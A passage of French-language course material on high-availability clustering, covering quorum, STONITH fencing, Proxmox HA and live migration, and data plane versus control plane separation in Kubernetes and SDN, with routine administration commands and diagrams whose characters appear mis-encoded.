Cluster Actif/Actif :

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Node 1        â”‚    â”‚   Node 2        â”‚
â”‚   (ACTIF)       â”‚    â”‚   (ACTIF)       â”‚
â”‚                 â”‚    â”‚                 â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ Service A   â”‚ â”‚    â”‚ â”‚ Service C   â”‚ â”‚
â”‚ â”‚ (Running)   â”‚ â”‚    â”‚ â”‚ (Running)   â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ Service B   â”‚ â”‚    â”‚ â”‚ Service D   â”‚ â”‚
â”‚ â”‚ (Running)   â”‚ â”‚    â”‚ â”‚ (Running)   â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚                       â”‚
         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           Load Balancer/Scheduler

En cas de panne Node 1 :
Node 2 hÃ©rite Services A+B
Utilisation : 100% des ressources
```

### Quorum et Split-Brain

Le **quorum** reprÃ©sente le nombre minimum de nÅ“uds nÃ©cessaires pour maintenir l'intÃ©gritÃ© du cluster et prendre des dÃ©cisions. Cette mÃ©canisme prÃ©vient le **split-brain**, situation catastrophique oÃ¹ plusieurs parties du cluster croient Ãªtre le maÃ®tre lÃ©gitime.

```
ProblÃ¨me Split-Brain :

Cluster 4 nÅ“uds - Perte rÃ©seau :

Partition A          Partition B
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Node 1    â”‚     â”‚   Node 3    â”‚
â”‚  (MASTER)   â”‚     â”‚  (MASTER)   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤     â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   Node 2    â”‚     â”‚   Node 4    â”‚
â”‚  (SLAVE)    â”‚     â”‚  (SLAVE)    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

RÃ©sultat : 2 clusters indÃ©pendants
Risque : Corruption de donnÃ©es
Solution : Quorum impair (3, 5, 7 nÅ“uds)

Quorum 3 nÅ“uds :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Node 1    â”‚     â”‚   Node 3    â”‚
â”‚  (MASTER)   â”‚     â”‚ (ISOLATED)  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”‚   Node 2    â”‚     
â”‚  (SLAVE)    â”‚     Partition B : Pas de quorum
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â†’ ArrÃªt automatique services

Partition A : Quorum maintenu (2/3)
â†’ Continue les opÃ©rations
```

### Fencing et STONITH

**Fencing** isole un nÅ“ud dÃ©faillant pour Ã©viter qu'il interfÃ¨re avec le cluster. **STONITH (Shoot The Other Node In The Head)** reprÃ©sente la mÃ©thode la plus radicale : couper physiquement l'alimentation du nÅ“ud problÃ©matique.

```bash
# Configuration fencing IPMI
stonith_admin --register fence_ipmilan --agent fence_ipmilan
crm configure primitive fence_node1 stonith:fence_ipmilan \
    params pcmk_host_list="node1" ipaddr="192.168.1.101" \
    login="admin" passwd="password" \
    op monitor interval="60s"

# Test fencing
stonith_admin --reboot node1
```

### Proxmox HA : Configuration et gestion

**Proxmox High Availability** intÃ¨gre nativement les fonctionnalitÃ©s de clustering avec gestion automatique des VM et conteneurs en cas de dÃ©faillance.

```bash
# CrÃ©ation cluster Proxmox
# Sur le premier nÅ“ud
pvecm create production-cluster

# Ajout des nÅ“uds supplÃ©mentaires
# Sur chaque nÅ“ud Ã  ajouter
pvecm add 192.168.1.100  # IP du premier nÅ“ud

# VÃ©rification cluster
pvecm status
pvecm nodes

# Configuration quorum
pvecm expected 3  # Forcer quorum pour 3 nÅ“uds
```

**Configuration HA pour les VM :**

```bash
# Activation HA pour une VM
ha-manager add vm:101 --state started --group production

# CrÃ©ation groupe HA avec prioritÃ©s
ha-manager groupadd production --nodes "node1:2,node2:1,node3:1"

# Configuration politique de migration
ha-manager set vm:101 --max_restart 3 --max_relocate 1

# Surveillance Ã©tat HA
ha-manager status
watch ha-manager status
```

### Stockage partagÃ© pour HA

La haute disponibilitÃ© nÃ©cessite un stockage accessible depuis tous les nÅ“uds du cluster. Sans stockage partagÃ©, les VM ne peuvent pas migrer entre nÅ“uds.

**Options de stockage HA :**

```
Stockage HA - Comparaison :

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Solution    â”‚Performance  â”‚ ComplexitÃ©  â”‚ CoÃ»t        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Ceph RBD    â”‚ Bonne       â”‚ Ã‰levÃ©e      â”‚ Faible      â”‚
â”‚ iSCSI SAN   â”‚ Excellente  â”‚ Moyenne     â”‚ Ã‰levÃ©       â”‚
â”‚ NFS         â”‚ Moyenne     â”‚ Faible      â”‚ Faible      â”‚
â”‚ GlusterFS   â”‚ Moyenne     â”‚ Moyenne     â”‚ Faible      â”‚
â”‚ ZFS over    â”‚ Bonne       â”‚ Ã‰levÃ©e      â”‚ Moyen       â”‚
â”‚ iSCSI       â”‚             â”‚             â”‚             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Recommandation production :
- Ceph : Clusters 3+ nÅ“uds, auto-rÃ©paration
- iSCSI : Performance maximale, SAN dÃ©diÃ©
- NFS : SimplicitÃ©, charges non-critiques
```

### Migration et Live Migration

**Migration Ã  froid** dÃ©place une VM arrÃªtÃ©e vers un autre nÅ“ud, nÃ©cessitant un arrÃªt de service.

**Live Migration** (migration Ã  chaud) transfÃ¨re une VM en fonctionnement sans interruption de service, technique essentielle pour la maintenance sans impact.

```bash
# Migration Ã  froid
qm migrate 101 node2

# Live migration
qm migrate 101 node2 --online

# Migration avec stockage
qm migrate 101 node2 --online --targetstorage ceph-storage

# Surveillance migration
qm status 101
tail -f /var/log/pve/tasks/active
```

**PrÃ©requis live migration :**
- Stockage partagÃ© ou rÃ©plication temps rÃ©el
- RÃ©seau haute performance (1Gbps minimum)
- CPU compatibles (mÃªme famille/features)
- Synchronisation temps (NTP)

### Monitoring et alertes HA

**Surveillance proactive** dÃ©tecte les problÃ¨mes avant qu'ils n'impactent la disponibilitÃ©.

```bash
# Script monitoring cluster
#!/bin/bash
CLUSTER_STATUS=$(pvecm status | grep "Quorum information" -A 10)
EXPECTED_NODES=3
ACTIVE_NODES=$(pvecm nodes | grep -c "online")

if [ $ACTIVE_NODES -lt $EXPECTED_NODES ]; then
    echo "ALERT: Only $ACTIVE_NODES/$EXPECTED_NODES nodes online"
    # Envoi alerte (email, Slack, etc.)
fi

# VÃ©rification services HA
HA_SERVICES=$(ha-manager status | grep -c "started")
if [ $HA_SERVICES -eq 0 ]; then
    echo "WARNING: No HA services running"
fi
```

**MÃ©triques critiques Ã  surveiller :**
- Ã‰tat des nÅ“uds cluster
- Quorum et connectivitÃ©
- Utilisation ressources (CPU, RAM, stockage)
- Latence rÃ©seau inter-nÅ“uds
- Ã‰tat des services HA

---

## 5.2 Data plane vs Control plane

### SÃ©paration des plans : Principe fondamental

La **sÃ©paration data plane / control plane** constitue un principe architectural fondamental qui distingue les fonctions de gestion et de contrÃ´le (control plane) des fonctions de traitement des donnÃ©es (data plane). Cette sÃ©paration amÃ©liore la sÃ©curitÃ©, les performances, et la maintenabilitÃ© des infrastructures complexes.

Imaginez cette sÃ©paration comme la **diffÃ©rence entre les pilotes et les contrÃ´leurs aÃ©riens** : les contrÃ´leurs (control plane) planifient les routes, gÃ¨rent le trafic et prennent les dÃ©cisions stratÃ©giques, tandis que les pilotes (data plane) exÃ©cutent les instructions et transportent effectivement les passagers. Cette sÃ©paration permet d'optimiser chaque fonction indÃ©pendamment.

### Control Plane : Cerveau du systÃ¨me

Le **control plane** gÃ¨re les dÃ©cisions, la configuration, et l'orchestration. Il dÃ©termine QUOI faire et COMMENT le faire, mais ne traite pas directement les donnÃ©es utilisateur.

```
Control Plane - ResponsabilitÃ©s :

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                Control Plane                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”‚
â”‚ â”‚ API Server  â”‚ â”‚ Scheduler   â”‚ â”‚ Controller  â”‚     â”‚
â”‚ â”‚             â”‚ â”‚             â”‚ â”‚ Manager     â”‚     â”‚
â”‚ â”‚ - Auth      â”‚ â”‚ - Placement â”‚ â”‚ - Reconcile â”‚     â”‚
â”‚ â”‚ - Validationâ”‚ â”‚ - Resources â”‚ â”‚ - Monitor   â”‚     â”‚
â”‚ â”‚ - Config    â”‚ â”‚ - Policies  â”‚ â”‚ - Heal      â”‚     â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”‚
â”‚ â”‚ etcd/DB     â”‚ â”‚ Networking  â”‚ â”‚ Storage     â”‚     â”‚
â”‚ â”‚             â”‚ â”‚ Controller  â”‚ â”‚ Controller  â”‚     â”‚
â”‚ â”‚ - State     â”‚ â”‚ - SDN       â”‚ â”‚ - Volumes   â”‚     â”‚
â”‚ â”‚ - Config    â”‚ â”‚ - Policies  â”‚ â”‚ - Snapshots â”‚     â”‚
â”‚ â”‚ - Metadata  â”‚ â”‚ - Routing   â”‚ â”‚ - Backup    â”‚     â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                         â”‚
                         â–¼ Instructions/Policies
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                  Data Plane                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Fonctions du control plane :**
- **Authentification et autorisation** des utilisateurs et services
- **Planification et scheduling** des ressources
- **Gestion de configuration** et des politiques
- **Surveillance et monitoring** de l'Ã©tat du systÃ¨me
- **Orchestration** des opÃ©rations complexes
- **Gestion des mÃ©tadonnÃ©es** et de l'Ã©tat dÃ©sirÃ©

### Data Plane : Muscle du systÃ¨me

Le **data plane** exÃ©cute les instructions du control plane et traite effectivement les donnÃ©es utilisateur. Il se concentre sur les performances, le dÃ©bit, et la latence.

```
Data Plane - Architecture :

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                   Data Plane                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”‚
â”‚ â”‚ Compute     â”‚ â”‚ Network     â”‚ â”‚ Storage     â”‚     â”‚
â”‚ â”‚ Workers     â”‚ â”‚ Forwarding  â”‚ â”‚ I/O         â”‚     â”‚
â”‚ â”‚             â”‚ â”‚             â”‚ â”‚             â”‚     â”‚
â”‚ â”‚ - VMs       â”‚ â”‚ - Switching â”‚ â”‚ - Read/Writeâ”‚     â”‚
â”‚ â”‚ - Containersâ”‚ â”‚ - Routing   â”‚ â”‚ - Caching   â”‚     â”‚
â”‚ â”‚ - Processes â”‚ â”‚ - Filtering â”‚ â”‚ - Replicationâ”‚     â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”‚
â”‚ â”‚ Hypervisor  â”‚ â”‚ OVS/eBPF    â”‚ â”‚ Ceph OSDs   â”‚     â”‚
â”‚ â”‚ KVM/QEMU    â”‚ â”‚ Hardware    â”‚ â”‚ ZFS         â”‚     â”‚
â”‚ â”‚             â”‚ â”‚ Offload     â”‚ â”‚ Block Devs  â”‚     â”‚
â”‚ â”‚ - CPU Sched â”‚ â”‚ - DPDK      â”‚ â”‚ - IOPS      â”‚     â”‚
â”‚ â”‚ - Memory    â”‚ â”‚ - SR-IOV    â”‚ â”‚ - Throughputâ”‚     â”‚
â”‚ â”‚ - I/O       â”‚ â”‚ - SmartNIC  â”‚ â”‚ - Latency   â”‚     â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Fonctions du data plane :**
- **ExÃ©cution des workloads** (VMs, conteneurs, applications)
- **Traitement rÃ©seau** (commutation, routage, filtrage)
- **OpÃ©rations de stockage** (lecture, Ã©criture, rÃ©plication)
- **Optimisation des performances** (cache, compression, offload)
- **Application des politiques** dÃ©finies par le control plane

### Exemples concrets de sÃ©paration

**Kubernetes : SÃ©paration native**

```
Kubernetes Architecture :

Control Plane (Master Nodes)     Data Plane (Worker Nodes)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ kube-apiserver          â”‚      â”‚ kubelet                 â”‚
â”‚ â”œâ”€ API REST             â”‚â—„â”€â”€â”€â”€â–ºâ”‚ â”œâ”€ Pod Management       â”‚
â”‚ â”œâ”€ Authentication       â”‚      â”‚ â”œâ”€ Container Runtime    â”‚
â”‚ â””â”€ Validation           â”‚      â”‚ â””â”€ Resource Monitoring  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤      â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ kube-scheduler          â”‚      â”‚ kube-proxy              â”‚
â”‚ â”œâ”€ Pod Placement        â”‚      â”‚ â”œâ”€ Service Discovery    â”‚
â”‚ â”œâ”€ Resource Allocation  â”‚      â”‚ â”œâ”€ Load Balancing       â”‚
â”‚ â””â”€ Affinity Rules       â”‚      â”‚ â””â”€ Network Policies     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤      â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ kube-controller-manager â”‚      â”‚ Container Runtime       â”‚
â”‚ â”œâ”€ Deployment Controllerâ”‚      â”‚ â”œâ”€ Docker/containerd    â”‚
â”‚ â”œâ”€ ReplicaSet Controllerâ”‚      â”‚ â”œâ”€ Pod Execution        â”‚
â”‚ â””â”€ Service Controller   â”‚      â”‚ â””â”€ Image Management     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤      â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ etcd                    â”‚      â”‚ CNI Plugin              â”‚
â”‚ â”œâ”€ Cluster State        â”‚      â”‚ â”œâ”€ Pod Networking       â”‚
â”‚ â”œâ”€ Configuration        â”‚      â”‚ â”œâ”€ IP Allocation        â”‚
â”‚ â””â”€ Service Discovery    â”‚      â”‚ â””â”€ Network Policies     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Proxmox : SÃ©paration implicite**

```bash
# Control Plane Proxmox
systemctl status pve-cluster    # Gestion cluster
systemctl status pvedaemon      # API et interface web
systemctl status pveproxy       # Proxy web
systemctl status pvestatd       # Collecte statistiques

# Data Plane Proxmox
systemctl status qemu-server    # ExÃ©cution VMs
systemctl status lxc            # ExÃ©cution conteneurs
systemctl status ceph-osd       # Stockage donnÃ©es
systemctl status openvswitch    # Commutation rÃ©seau
```

### SDN : Software Defined Networking

**SDN** illustre parfaitement la sÃ©paration data/control plane en centralisant l'intelligence rÃ©seau dans un contrÃ´leur logiciel tout en dÃ©portant l'exÃ©cution vers des switches "stupides".

```
SDN Architecture :

                Control Plane (CentralisÃ©)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              SDN Controller                         â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ Topology    â”‚ â”‚ Path        â”‚ â”‚ Policy      â”‚   â”‚
â”‚  â”‚ Discovery   â”‚ â”‚ Computation â”‚ â”‚ Engine      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ Flow        â”‚ â”‚ QoS         â”‚ â”‚ Security    â”‚   â”‚
â”‚  â”‚ Programming â”‚ â”‚ Management  â”‚ â”‚ Policies    â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                         â”‚ OpenFlow/NETCONF
                         â–¼
                Data Plane (DistribuÃ©)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Switch 1    â”‚ â”‚ Switch 2    â”‚ â”‚ Switch 3    â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚Flow     â”‚ â”‚ â”‚ â”‚Flow     â”‚ â”‚ â”‚ â”‚Flow     â”‚ â”‚
â”‚ â”‚Table    â”‚ â”‚ â”‚ â”‚Table    â”‚ â”‚ â”‚ â”‚Table    â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚Packet   â”‚ â”‚ â”‚ â”‚Packet   â”‚ â”‚ â”‚ â”‚Packet   â”‚ â”‚
â”‚ â”‚Forward  â”‚ â”‚ â”‚ â”‚Forward  â”‚ â”‚ â”‚ â”‚Forward  â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Configuration SDN avec Open vSwitch :**

```bash
# Installation contrÃ´leur SDN (exemple : Floodlight)
wget http://floodlight.openflowhub.org/files/floodlight-vm-1.2.ova

# Configuration OVS pour SDN
ovs-vsctl set-controller br0 tcp:192.168.1.100:6653
ovs-vsctl set bridge br0 protocols=OpenFlow13

# VÃ©rification connexion contrÃ´leur
ovs-vsctl show
ovs-ofctl show br0

# Programmation flows via contrÃ´leur
curl -X POST -d '{
    "switch": "00:00:00:00:00:00:00:01",
    "name": "flow-1",
    "priority": "100",
    "in_port": "1",
    "active": "true",
    "actions": "output=2"
}' http://192.168.1.100:8080/wm/staticflowpusher/json
```

### Avantages de la sÃ©paration

**SÃ©curitÃ© renforcÃ©e** : Le control plane peut Ãªtre isolÃ© dans un rÃ©seau sÃ©curisÃ©, rÃ©duisant la surface d'attaque.

```bash
# Isolation rÃ©seau control plane
# VLAN dÃ©diÃ© pour management
auto ens18.100
iface ens18.100 inet static
    address 10.0.100.10/24
    vlan-raw-device ens18

# Firewall restrictif control plane
iptables -A INPUT -i ens18.100 -p tcp --dport 8006 -j ACCEPT  # Proxmox web
iptables -A INPUT -i ens18.100 -p tcp --dport 22 -j ACCEPT    # SSH
iptables -A INPUT -i ens18.100 -j DROP  # Tout le reste
```

**ScalabilitÃ© amÃ©liorÃ©e** : Le data plane peut Ãªtre distribuÃ© et optimisÃ© indÃ©pendamment du control plane.

